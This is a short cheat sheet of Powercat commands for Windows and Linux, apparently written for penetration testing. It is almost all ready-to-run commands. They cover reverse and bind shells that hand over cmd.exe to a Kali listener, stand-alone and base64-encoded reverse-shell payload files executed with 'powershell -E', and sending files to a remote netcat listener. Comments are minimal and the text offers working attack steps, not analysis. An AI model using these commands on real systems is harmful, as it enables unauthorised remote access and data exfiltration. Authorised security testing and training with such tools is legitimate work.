# Powercat 

```bash
# Download and install powercat to a Windows or Linux host
PS C:\> git clone https://github.com/besimorhino/powercat
```

```powershell
# Load powercat and view help
PS C:\> . .\powercat.ps1
PS C:\> powercat -h
```

```powershell
# Powercat reverse shell to Kali box
$ sudo nc -lvp 443

# Send a reverse shell via Powercat 
PS C:\> powercat -c <ip_address> -p 443 -e cmd.exe
```

```powershell
# Powercat bind shells
PS C:\> powercat -l -p 443 -e cmd.exe

# Use netcat to connect to the bind shell
$ nc -nv <ip_address> 443
```

```powershell
# Powercat Stand-alone payload
PS C:\> powercat -c <listener IP address> -p 443 -e cmd.exe -g > reverseshell.ps1

# Generate stand-alone encoded payload
PS C:\> powercat -c <ip_address> -p 443 -e cmd.exe -ge > encoded_reverseshell.ps1

PS C:\> powershell -E <content from encoded_reverseshell.ps1>
```

```powershell
# Set up a netcat listener on Kali Linux to receive a file from a remote Windows host
$ nc -nlvp <port> > file.txt

# Use powercat to transfer a file to a remote Kali Linux listener 
PS C:\> powercat -c <ip_address> -p <port> -i <file_location>
```
